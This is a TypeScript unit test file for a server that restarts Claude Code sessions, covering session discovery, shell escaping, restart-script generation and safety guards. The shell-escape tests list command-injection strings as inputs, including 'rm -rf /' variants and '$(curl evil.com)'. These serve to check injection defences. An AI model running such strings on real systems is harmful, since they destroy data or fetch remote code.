/**
 * Unit tests for Session Restart MCP Server
 *
 * Tests session discovery, shell escaping, script generation,
 * safety guards, and validation logic for automated Claude Code restarts.
 *
 * Uses temporary file systems and mocked process information for isolation.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { randomUUID } from 'crypto';

import { createTempDir } from '../../__testUtils__/index.js';

// ============================================================================
// Test Utilities
// ============================================================================

/**
 * Create a mock session directory structure matching Claude's layout
 */
function createSessionDir(projectPath: string): string {
  const normalizedPath = projectPath.replace(/[^a-zA-Z0-9]/g, '-').replace(/^-/, '');
  const sessionDir = path.join(os.homedir(), '.claude', 'projects', `-${normalizedPath}`);
  fs.mkdirSync(sessionDir, { recursive: true });
  return sessionDir;
}

/**
 * Create a session file with specified modification time
 */
function createSessionFile(sessionDir: string, sessionId: string, mtimeMs: number): string {
  const filePath = path.join(sessionDir, `${sessionId}.jsonl`);
  fs.writeFileSync(filePath, JSON.stringify({ type: 'session', id: sessionId }));

  // Set modification time
  const mtime = new Date(mtimeMs);
  fs.utimesSync(filePath, mtime, mtime);

  return filePath;
}

// ============================================================================
// Helper Functions (Mirror Server Implementation)
// ============================================================================

const UUID_REGEX = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;

/**
 * Get session directory for a project path
 */
function getSessionDir(projectPath: string): string {
  const normalizedPath = projectPath.replace(/[^a-zA-Z0-9]/g, '-').replace(/^-/, '');
  return path.join(os.homedir(), '.claude', 'projects', `-${normalizedPath}`);
}

/**
 * Discover session ID from .jsonl files
 */
function discoverSessionId(projectPath: string): string {
  const sessionDir = getSessionDir(projectPath);

  if (!fs.existsSync(sessionDir)) {
    throw new Error(`Session directory not found: ${sessionDir}`);
  }

  const files = fs.readdirSync(sessionDir)
    .filter(f => f.endsWith('.jsonl'))
    .map(f => {
      const filePath = path.join(sessionDir, f);
      const stat = fs.statSync(filePath);
      return { name: f, mtime: stat.mtimeMs, size: stat.size };
    })
    .sort((a, b) => b.mtime - a.mtime || b.size - a.size);

  if (files.length === 0) {
    throw new Error(`No session files found in: ${sessionDir}`);
  }

  const sessionId = files[0].name.replace('.jsonl', '');

  if (!UUID_REGEX.test(sessionId)) {
    throw new Error(`Session filename is not a valid UUID: ${sessionId}`);
  }

  return sessionId;
}

/**
 * Shell escape function (prevents command injection)
 */
function shellEscape(s: string): string {
  // If the string contains no special characters, return as-is
  if (/^[a-zA-Z0-9._\-/~]+$/.test(s)) {
    return s;
  }
  return `'${s.replace(/'/g, "'\\''")}'`;
}

/**
 * Validate session_id format
 */
function validateSessionId(sessionId: string): void {
  if (!UUID_REGEX.test(sessionId)) {
    throw new Error(`Invalid session_id format: ${sessionId}`);
  }
}

type TerminalType = 'apple_terminal' | 'iterm' | 'unknown';

/**
 * Detect terminal from environment
 */
function detectTerminal(termProgram: string): TerminalType {
  if (termProgram === 'Apple_Terminal') {
    return 'apple_terminal';
  }
  if (termProgram === 'iTerm.app' || termProgram === 'iTerm2') {
    return 'iterm';
  }
  return 'unknown';
}

/**
 * Generate restart script
 */
function generateRestartScript(
  claudePid: number,
  sessionId: string,
  projectDir: string,
  terminal: TerminalType,
): string {
  const resumeCommand = `cd ${shellEscape(projectDir)} && claude --resume ${sessionId}`;

  const killBlock = `
# Wait for MCP response to propagate
sleep 1

# Graceful shutdown
kill -TERM ${claudePid} 2>/dev/null

# Poll for exit (up to 10s)
for i in $(seq 1 20); do
  kill -0 ${claudePid} 2>/dev/null || break
  sleep 0.5
done

# Force kill if still alive
kill -0 ${claudePid} 2>/dev/null && kill -9 ${claudePid} 2>/dev/null

# Let shell settle
sleep 0.5
`;

  let resumeBlock: string;

  if (terminal === 'apple_terminal') {
    const escapedCommand = resumeCommand.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
    resumeBlock = `
# Resume in the same Terminal.app tab
osascript -e 'tell application "Terminal" to do script "${escapedCommand}" in selected tab of front window'
`;
  } else if (terminal === 'iterm') {
    const escapedCommand = resumeCommand.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
    resumeBlock = `
# Resume in the same iTerm session
osascript -e 'tell application "iTerm2" to tell current session of current window to write text "${escapedCommand}"'
`;
  } else {
    resumeBlock = `
# Unknown terminal — cannot auto-resume
echo ""
echo "Claude Code killed. Resume manually with:"
echo "  ${resumeCommand}"
echo ""
`;
  }

  return `#!/bin/bash
${killBlock}
${resumeBlock}
`;
}

// ============================================================================
// Tests: Session Discovery
// ============================================================================

describe('Session Discovery', () => {
  let tempDir: ReturnType<typeof createTempDir>;
  let sessionDir: string;

  beforeEach(() => {
    tempDir = createTempDir('session-restart-test');
    sessionDir = createSessionDir(tempDir.path);
  });

  afterEach(() => {
    tempDir.cleanup();
    // Clean up session directory
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
  });

  it('should discover the most recently modified session file', () => {
    const oldSessionId = randomUUID();
    const newSessionId = randomUUID();

    // Create old session (1 hour ago)
    createSessionFile(sessionDir, oldSessionId, Date.now() - 3600000);

    // Create new session (now)
    createSessionFile(sessionDir, newSessionId, Date.now());

    const discovered = discoverSessionId(tempDir.path);

    expect(discovered).toBe(newSessionId);
  });

  it('should use file size as tiebreaker when mtime is equal', () => {
    const sessionId1 = randomUUID();
    const sessionId2 = randomUUID();
    const sameTime = Date.now();

    // Create first file (smaller)
    const path1 = path.join(sessionDir, `${sessionId1}.jsonl`);
    fs.writeFileSync(path1, 'small');
    fs.utimesSync(path1, new Date(sameTime), new Date(sameTime));

    // Create second file (larger)
    const path2 = path.join(sessionDir, `${sessionId2}.jsonl`);
    fs.writeFileSync(path2, 'much larger content here');
    fs.utimesSync(path2, new Date(sameTime), new Date(sameTime));

    const discovered = discoverSessionId(tempDir.path);

    // Should pick the larger file
    expect(discovered).toBe(sessionId2);
  });

  it('should throw when session directory does not exist', () => {
    // Remove session directory
    fs.rmSync(sessionDir, { recursive: true, force: true });

    expect(() => discoverSessionId(tempDir.path)).toThrow(/Session directory not found/);
  });

  it('should throw when no .jsonl files exist', () => {
    // Session dir exists but is empty
    expect(() => discoverSessionId(tempDir.path)).toThrow(/No session files found/);
  });

  it('should throw when session filename is not a valid UUID', () => {
    // Create invalid session file
    const invalidPath = path.join(sessionDir, 'not-a-uuid.jsonl');
    fs.writeFileSync(invalidPath, 'invalid');

    expect(() => discoverSessionId(tempDir.path)).toThrow(/Session filename is not a valid UUID/);
  });

  it('should ignore non-.jsonl files', () => {
    const validSessionId = randomUUID();

    // Create noise files
    fs.writeFileSync(path.join(sessionDir, 'readme.txt'), 'ignore me');
    fs.writeFileSync(path.join(sessionDir, 'config.json'), '{}');

    // Create valid session
    createSessionFile(sessionDir, validSessionId, Date.now());

    const discovered = discoverSessionId(tempDir.path);

    expect(discovered).toBe(validSessionId);
  });
});

// ============================================================================
// Tests: Shell Escape Function
// ============================================================================

describe('Shell Escape Function', () => {
  it('should return safe strings unmodified', () => {
    const safePaths = [
      '/usr/local/bin',
      'my-project',
      'file_name.txt',
      '~/.config',
      'simple123',
    ];

    for (const safe of safePaths) {
      expect(shellEscape(safe)).toBe(safe);
    }
  });

  it('should quote strings with spaces', () => {
    const input = '/path/with spaces/file.txt';
    const result = shellEscape(input);

    expect(result).toBe("'/path/with spaces/file.txt'");
  });

  it('should escape single quotes correctly', () => {
    const input = "path/with'quote";
    const result = shellEscape(input);

    // Single quote escaping: 'path/with'\''quote'
    expect(result).toBe("'path/with'\\''quote'");
  });

  it('should handle multiple single quotes', () => {
    const input = "it's a test's file";
    const result = shellEscape(input);

    expect(result).toBe("'it'\\''s a test'\\''s file'");
  });

  it('should quote strings with special shell characters', () => {
    const dangerous = [
      'file;rm -rf /',
      'test$(whoami)',
      'test`date`',
      'test|grep secret',
      'test&background',
      'test>output.txt',
    ];

    for (const input of dangerous) {
      const result = shellEscape(input);
      expect(result.startsWith("'")).toBe(true);
      expect(result.endsWith("'")).toBe(true);
    }
  });

  it('should handle empty strings', () => {
    const result = shellEscape('');
    expect(result).toBe("''");
  });

  it('should prevent command injection via newlines', () => {
    const injection = 'test\nrm -rf /';
    const result = shellEscape(injection);

    expect(result).toBe("'test\nrm -rf /'");
  });

  it('should handle complex injection attempts', () => {
    const injections = [
      "'; rm -rf / #",
      "test' || echo 'hacked",
      "$(curl evil.com)",
      "`malicious command`",
    ];

    for (const attempt of injections) {
      const result = shellEscape(attempt);
      // Should be wrapped in quotes with proper escaping
      expect(result).toContain("'");
    }
  });
});

// ============================================================================
// Tests: Session ID Validation
// ============================================================================

describe('Session ID Validation', () => {
  it('should accept valid UUIDs', () => {
    const validUUIDs = [
      'a1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d',
      '00000000-0000-0000-0000-000000000000',
      'ffffffff-ffff-4fff-8fff-ffffffffffff',
    ];

    for (const uuid of validUUIDs) {
      expect(() => validateSessionId(uuid)).not.toThrow();
    }
  });

  it('should reject invalid UUID formats', () => {
    const invalidUUIDs = [
      'not-a-uuid',
      '12345',
      'a1b2c3d4-e5f6-4a5b-8c7d', // Too short
      'a1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d-extra', // Too long
      'g1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d', // Invalid hex character
      'a1b2c3d4_e5f6_4a5b_8c7d_9e0f1a2b3c4d', // Wrong separator
    ];

    for (const invalid of invalidUUIDs) {
      expect(() => validateSessionId(invalid)).toThrow(/Invalid session_id format/);
    }
  });

  it('should reject uppercase UUIDs (RFC 4122 uses lowercase)', () => {
    const uppercase = 'A1B2C3D4-E5F6-4A5B-8C7D-9E0F1A2B3C4D';
    expect(() => validateSessionId(uppercase)).toThrow(/Invalid session_id format/);
  });

  it('should reject empty string', () => {
    expect(() => validateSessionId('')).toThrow(/Invalid session_id format/);
  });
});

// ============================================================================
// Tests: Terminal Detection
// ============================================================================

describe('Terminal Detection', () => {
  it('should detect Apple Terminal', () => {
    const result = detectTerminal('Apple_Terminal');
    expect(result).toBe('apple_terminal');
  });

  it('should detect iTerm (iTerm.app)', () => {
    const result = detectTerminal('iTerm.app');
    expect(result).toBe('iterm');
  });

  it('should detect iTerm2', () => {
    const result = detectTerminal('iTerm2');
    expect(result).toBe('iterm');
  });

  it('should return unknown for other terminals', () => {
    const unknownTerminals = [
      'Alacritty',
      'Hyper',
      'WezTerm',
      'kitty',
      '',
    ];

    for (const term of unknownTerminals) {
      expect(detectTerminal(term)).toBe('unknown');
    }
  });
});

// ============================================================================
// Tests: Restart Script Generation
// ============================================================================

describe('Restart Script Generation', () => {
  const testPid = 12345;
  const testSessionId = 'a1b2c3d4-e5f6-4a5b-8c7d-9e0f1a2b3c4d';
  const testProjectDir = '/Users/test/projects/my-app';

  it('should generate script with Apple Terminal AppleScript', () => {
    const script = generateRestartScript(testPid, testSessionId, testProjectDir, 'apple_terminal');

    expect(script).toContain('#!/bin/bash');
    expect(script).toContain(`kill -TERM ${testPid}`);
    expect(script).toContain('osascript');
    expect(script).toContain('Terminal');
    expect(script).toContain(`claude --resume ${testSessionId}`);
  });

  it('should generate script with iTerm AppleScript', () => {
    const script = generateRestartScript(testPid, testSessionId, testProjectDir, 'iterm');

    expect(script).toContain('#!/bin/bash');
    expect(script).toContain(`kill -TERM ${testPid}`);
    expect(script).toContain('osascript');
    expect(script).toContain('iTerm2');
    expect(script).toContain(`claude --resume ${testSessionId}`);
  });

  it('should generate manual restart message for unknown terminal', () => {
    const script = generateRestartScript(testPid, testSessionId, testProjectDir, 'unknown');

    expect(script).toContain('#!/bin/bash');
    expect(script).toContain(`kill -TERM ${testPid}`);
    expect(script).toContain('Unknown terminal');
    expect(script).toContain('Resume manually');
    expect(script).toContain(`claude --resume ${testSessionId}`);
    expect(script).not.toContain('osascript');
  });

  it('should properly escape project paths with spaces in AppleScript', () => {
    const pathWithSpaces = '/Users/test/My Projects/app name';
    const script = generateRestartScript(testPid, testSessionId, pathWithSpaces, 'apple_terminal');

    // Should contain shell-escaped path (single quotes for bash)
    expect(script).toContain("'/Users/test/My Projects/app name'");
    // Should contain osascript command for Terminal.app
    expect(script).toContain('osascript');
    expect(script).toContain('Terminal');
  });

  it('should include graceful shutdown with timeout', () => {
    const script = generateRestartScript(testPid, testSessionId, testProjectDir, 'apple_terminal');

    expect(script).toContain('kill -TERM');
    expect(script).toContain('seq 1 20'); // 10 second timeout
    expect(script).toContain('kill -9'); // Force kill fallback
  });

  it('should include sleep delays for proper timing', () => {
    const script = generateRestartScript(testPid, testSessionId, testProjectDir, 'apple_terminal');

    expect(script).toContain('sleep 1'); // Initial delay
    expect(script).toContain('sleep 0.5'); // Poll and settle delays
  });

  it('should escape backslashes in AppleScript commands', () => {
    const pathWithBackslash = '/path/to\\test';
    const script = generateRestartScript(testPid, testSessionId, pathWithBackslash, 'iterm');

    // Backslashes should be doubled for AppleScript
    expect(script).toContain('\\\\');
  });
});

// ============================================================================
// Tests: Safety Guard Behavior
// ============================================================================

describe('Safety Guard', () => {
  it('should require confirm=true to proceed', () => {
    interface SessionRestartArgs {
      confirm: boolean;
      session_id?: string;
    }

    const validateConfirm = (args: SessionRestartArgs) => {
      if (args.confirm !== true) {
        throw new Error('confirm must be true to proceed with session restart');
      }
    };

    // Should reject when confirm is false
    expect(() => validateConfirm({ confirm: false })).toThrow(/confirm must be true/);

    // Should reject when confirm is missing/undefined
    expect(() => validateConfirm({ confirm: undefined as unknown as boolean })).toThrow(/confirm must be true/);

    // Should accept when confirm is true
    expect(() => validateConfirm({ confirm: true })).not.toThrow();
  });

  it('should reject non-boolean confirm values', () => {
    const validateConfirm = (args: { confirm: boolean }) => {
      if (args.confirm !== true) {
        throw new Error('confirm must be true to proceed with session restart');
      }
    };

    // These should all be rejected by Zod schema, but test runtime behavior
    const invalidValues = [
      { confirm: 'true' as unknown as boolean },
      { confirm: 1 as unknown as boolean },
      { confirm: null as unknown as boolean },
    ];

    for (const args of invalidValues) {
      expect(() => validateConfirm(args)).toThrow(/confirm must be true/);
    }
  });
});

// ============================================================================
// Tests: Result Structure Validation
// ============================================================================

describe('Result Structure', () => {
  it('should validate result has all required fields', () => {
    interface SessionRestartResult {
      success: boolean;
      session_id: string;
      project_dir: string;
      claude_pid: number;
      method: 'applescript_terminal' | 'applescript_iterm' | 'manual';
      message: string;
      resume_command: string;
    }

    const mockResult: SessionRestartResult = {
      success: true,
      session_id: randomUUID(),
      project_dir: '/test/project',
      claude_pid: 12345,
      method: 'applescript_terminal',
      message: 'Restart script spawned',
      resume_command: 'cd /test/project && claude --resume abc-123',
    };

    expect(mockResult).toHaveProperty('success');
    expect(mockResult).toHaveProperty('session_id');
    expect(mockResult).toHaveProperty('project_dir');
    expect(mockResult).toHaveProperty('claude_pid');
    expect(mockResult).toHaveProperty('method');
    expect(mockResult).toHaveProperty('message');
    expect(mockResult).toHaveProperty('resume_command');

    expect(typeof mockResult.success).toBe('boolean');
    expect(typeof mockResult.session_id).toBe('string');
    expect(typeof mockResult.project_dir).toBe('string');
    expect(typeof mockResult.claude_pid).toBe('number');
    expect(typeof mockResult.method).toBe('string');
    expect(typeof mockResult.message).toBe('string');
    expect(typeof mockResult.resume_command).toBe('string');
  });

  it('should validate method is one of allowed values', () => {
    const allowedMethods: Array<'applescript_terminal' | 'applescript_iterm' | 'manual'> = [
      'applescript_terminal',
      'applescript_iterm',
      'manual',
    ];

    for (const method of allowedMethods) {
      expect(['applescript_terminal', 'applescript_iterm', 'manual']).toContain(method);
    }
  });

  it('should validate resume_command contains proper format', () => {
    const testSessionId = randomUUID();
    const testProjectDir = '/test/project';
    const resumeCommand = `cd ${shellEscape(testProjectDir)} && claude --resume ${testSessionId}`;

    expect(resumeCommand).toContain('cd');
    expect(resumeCommand).toContain('claude --resume');
    expect(resumeCommand).toContain(testSessionId);
  });
});

// ============================================================================
// Tests: G001 Fail-Closed Behavior
// ============================================================================

describe('G001 Fail-Closed Behavior', () => {
  it('should fail loudly when session discovery fails', () => {
    const nonExistentPath = '/tmp/does-not-exist-' + randomUUID();

    expect(() => discoverSessionId(nonExistentPath)).toThrow();
  });

  it('should fail loudly on invalid UUID format', () => {
    expect(() => validateSessionId('invalid')).toThrow();
  });

  it('should fail loudly when safety guard not confirmed', () => {
    const validateConfirm = (confirm: boolean) => {
      if (confirm !== true) {
        throw new Error('confirm must be true to proceed with session restart');
      }
    };

    expect(() => validateConfirm(false)).toThrow();
  });

  it('should never fallback gracefully on validation errors', () => {
    // This test documents the fail-closed policy:
    // NO silent failures, NO default values, NO graceful fallbacks

    const failClosedChecks = [
      () => discoverSessionId('/nonexistent'), // Must throw
      () => validateSessionId('not-a-uuid'), // Must throw
    ];

    for (const check of failClosedChecks) {
      expect(check).toThrow();
    }
  });
});
